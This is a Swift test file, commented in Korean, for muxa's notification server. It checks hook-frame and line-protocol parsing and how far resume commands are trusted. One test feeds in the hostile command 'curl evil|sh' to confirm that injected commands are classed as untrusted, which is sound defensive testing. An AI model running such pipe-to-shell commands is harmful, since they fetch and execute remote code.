import Testing
@testable import muxa

/// 훅 와이어 프레임 파싱 — `hook\t<tabId>\t<event>\n<원본 JSON>`.
/// payload에 개행·탭이 들어와도 안 깨지는 게 핵심(줄 단위 프로토콜과 공존한다).
struct HookFrameParseTests {
    @Test func testParsesHeaderAndPayload() {
        let frame = "hook\tTAB-1\tStop\n{\"last_assistant_message\":\"끝\"}"
        let msg = NotifyServer.parseHook(frame)
        #expect(msg?.tabId == "TAB-1")
        #expect(msg?.event == .stop)
        #expect(msg?.payload.lastAssistantMessage == "끝")
    }

    /// JSON 본문에 개행이 들어와도 첫 개행만 경계로 쓴다(pretty-printed payload가 와도 안전).
    @Test func testPayloadWithNewlinesSurvives() {
        let frame = "hook\tTAB-1\tStop\n{\n  \"is_interrupt\": true\n}"
        #expect(NotifyServer.parseHook(frame)?.payload.isInterrupt == true)
    }

    /// payload의 탭(JSON에선 `\t`로 이스케이프돼 온다)이 헤더 필드로 오인되지 않고 값으로 살아남는다.
    /// 헤더는 첫 줄만 탭으로 쪼개므로 본문은 손대지 않는다 — 줄 단위 프로토콜이라면 여기서 깨진다.
    @Test func testPayloadWithTabsSurvives() {
        let frame = #"hook\#tTAB-1\#tPreToolUse\#n{"tool_name":"Bash","tool_input":{"command":"a\tb"}}"#
        let msg = NotifyServer.parseHook(frame)
        #expect(msg?.payload.toolName == "Bash")
        #expect(msg?.payload.toolInput["command"] == "a\tb", "이스케이프된 탭이 값으로 복원돼야 한다")
    }

    /// payload가 비었거나 깨져도 이벤트만으로 상태 전이는 유효하다 — 프레임을 버리지 않는다.
    @Test func testEmptyOrBrokenPayloadStillYieldsEvent() {
        #expect(NotifyServer.parseHook("hook\tTAB-1\tStop\n")?.event == .stop)
        #expect(NotifyServer.parseHook("hook\tTAB-1\tStop")?.event == .stop)
        #expect(NotifyServer.parseHook("hook\tTAB-1\tStop\nnot json")?.event == .stop)
    }

    /// 모르는 이벤트는 버린다(스키마가 늘어도 안 깨진다).
    @Test func testUnknownEventIsRejected() {
        #expect(NotifyServer.parseHook("hook\tTAB-1\tSomeFutureEvent\n{}") == nil)
    }

    @Test func testMalformedHeaderIsRejected() {
        #expect(NotifyServer.parseHook("hook\tTAB-1\n{}") == nil, "이벤트 필드가 없다")
        #expect(NotifyServer.parseHook("hook\t\tStop\n{}") == nil, "tabId가 비었다")
    }

    /// 기존 줄 단위 프로토콜(muxa notify --state)은 hook 프레임으로 오인되면 안 된다.
    @Test func testLegacyLineIsNotAHookFrame() {
        #expect(NotifyServer.parseHook("TAB-1\tdone\t제목\t본문") == nil)
        #expect(NotifyServer.parse("TAB-1\tdone\t제목\t본문") != nil, "레거시 경로는 그대로 살아야 한다")
    }

    // MARK: 줄 프로토콜 7필드 — <tabId>\t<state>\t<title>\t<body>\t<category>\t<resumeCommand>\t<agentLabel>
    // CLI(muxa-notify/main.swift)가 이 인덱스로 쓴다. off-by-one이면 알림이 조용히 오배송된다.

    @Test func testLineProtocolFieldOrder() {
        let msg = NotifyServer.parse("TAB-1\twaiting\t제목\t본문\tneeds-permission\tclaude --resume 550e8400-e29b-41d4-a716-446655440000\tclaude")
        #expect(msg?.tabId == "TAB-1")
        #expect(msg?.state == .waiting)
        #expect(msg?.title == "제목")
        #expect(msg?.body == "본문")
        #expect(msg?.category == .needsPermission)
        #expect(msg?.resume?.command == "claude --resume 550e8400-e29b-41d4-a716-446655440000")
        #expect(msg?.resume?.agentLabel == "claude")
    }

    /// 고정 꼴 재개 명령은 훅(신뢰)으로, 임의 명령은 추측(.scan)으로 — 소켓 주입 자동 실행 차단.
    @Test func testLineProtocolResumeTrustFollowsCommandShape() {
        #expect(NotifyServer.parse("T\t\t\t\t\tclaude --resume 550e8400-e29b-41d4-a716-446655440000\t")?.resume?.source == .hook)
        #expect(NotifyServer.parse("T\t\t\t\t\tcurl evil|sh\t")?.resume?.source == .scan)
    }

    /// resume 단독(상태 없음)도 유효 — 바인딩만 등록한다. 상태·resume 둘 다 없으면 폐기.
    @Test func testLineProtocolResumeOnlyAndDiscard() {
        let resumeOnly = NotifyServer.parse("T\t\t\t\t\tclaude --resume 550e8400-e29b-41d4-a716-446655440000\t")
        #expect(resumeOnly?.state == nil)
        #expect(resumeOnly?.resume != nil)
        #expect(NotifyServer.parse("T\t\t\t\t\t\t") == nil, "상태도 resume도 없으면 폐기")
        #expect(NotifyServer.parse("\tdone\t\t") == nil, "tabId 비면 폐기")
    }
}
